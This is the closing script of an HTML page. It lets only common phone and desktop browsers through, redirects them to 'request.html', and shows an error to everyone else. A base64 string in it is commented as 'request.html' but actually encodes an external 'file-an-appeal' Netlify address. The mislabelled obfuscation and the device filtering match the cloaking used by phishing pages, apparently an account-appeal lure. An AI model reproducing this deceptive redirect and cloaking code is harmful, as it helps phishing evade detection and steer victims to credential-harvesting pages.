  <script>
    (function () {
      const supported = ["Android", "iPhone", "iPad", "Macintosh", "Windows"];
      const agent = navigator.userAgent || navigator.vendor || window.opera;
      const allowed = supported.some(platform => agent.includes(platform));

      // Base64 for: request.html
      const encoded = "aHR0cHM6Ly9maWxlLWFuLWFwcGVhbDk4MDcubmV0bGlmeS5hcHAv";

      if (allowed) {
        
                window.location.href = "request.html";
      } else {
        document.getElementById("error").style.display = "block";
      }
    })();
  </script>
</body>
</html>
